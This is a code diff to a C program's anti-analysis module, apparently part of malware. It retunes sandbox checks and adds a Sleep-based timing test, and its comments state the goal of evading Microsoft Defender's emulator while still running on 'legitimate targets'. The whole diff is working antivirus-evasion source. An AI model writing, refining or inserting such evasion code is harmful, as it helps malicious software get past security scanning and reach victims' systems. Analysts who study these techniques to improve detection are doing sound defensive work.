@@ -120,22 +120,26 @@ BOOL check_timing(void) {
 /* ─── Anti-Sandbox ─── */
 
 BOOL check_sandbox_resources(void) {
-    /* CPU count: most sandboxes have 1-2 CPUs */
-    SYSTEM_INFO si;
-    GetSystemInfo(&si);
-    if (si.dwNumberOfProcessors < 2)
-        return FALSE;
+    /*
+     * Tuned thresholds: must catch Defender's emulator (reports 1 CPU,
+     * minimal RAM, near-zero uptime) while passing real VMs/workstations.
+     *
+     * CPU check removed — both real VMs and emulators can report 1 CPU,
+     * so this check has too many false positives on legitimate targets.
+     */
 
-    /* RAM: sandboxes typically have <4GB */
+    /* RAM: Defender's emulator exposes very little memory.
+     * Windows 11 requires 4GB minimum, so 2GB is safe. */
     MEMORYSTATUSEX ms;
     ms.dwLength = sizeof(ms);
     GlobalMemoryStatusEx(&ms);
-    if (ms.ullTotalPhys < (ULONGLONG)4 * 1024 * 1024 * 1024)
+    if (ms.ullTotalPhys < (ULONGLONG)2 * 1024 * 1024 * 1024)
         return FALSE;
 
-    /* Uptime: if system just booted (<10min), likely a sandbox */
+    /* Uptime: emulators show near-zero uptime.
+     * 60 seconds is short enough that normal testing works fine. */
     ULONGLONG uptime_ms = GetTickCount64();
-    if (uptime_ms < 10ULL * 60 * 1000)
+    if (uptime_ms < 60ULL * 1000)
         return FALSE;
 
     return TRUE;
@@ -246,6 +250,30 @@ BOOL check_vm_hypervisor(void) {
 }
 
 
+/* ─── Anti-Emulation ─── */
+
+BOOL check_emulator_timing(void) {
+    /*
+     * Defender's emulator fast-forwards Sleep() — it doesn't actually wait.
+     * We Sleep for a short time and verify the wall clock advanced.
+     * If the delta is too small, we're being emulated.
+     *
+     * This is the primary anti-emulation gate.  The sandbox resource
+     * checks (RAM, uptime) also trip emulators, but this one is more
+     * direct and harder to fake.
+     */
+    ULONGLONG t1 = GetTickCount64();
+    Sleep(750);
+    ULONGLONG t2 = GetTickCount64();
+
+    /* Real hardware: delta ≈ 750.  Emulator: delta ≈ 0-10. */
+    if (t2 - t1 < 600)
+        return FALSE;
+
+    return TRUE;
+}
+
+
 /* ─── Master load-time check ─── */
 
 BOOL anti_analysis_check(void) {
@@ -257,6 +285,7 @@ BOOL anti_analysis_check(void) {
 #endif
 
 #if CONFIG_ANTI_SANDBOX
+    if (!check_emulator_timing())   return FALSE;
     if (!check_sandbox_resources()) return FALSE;
     if (!check_sandbox_artifacts()) return FALSE;
     if (!check_vm_hypervisor())     return FALSE;
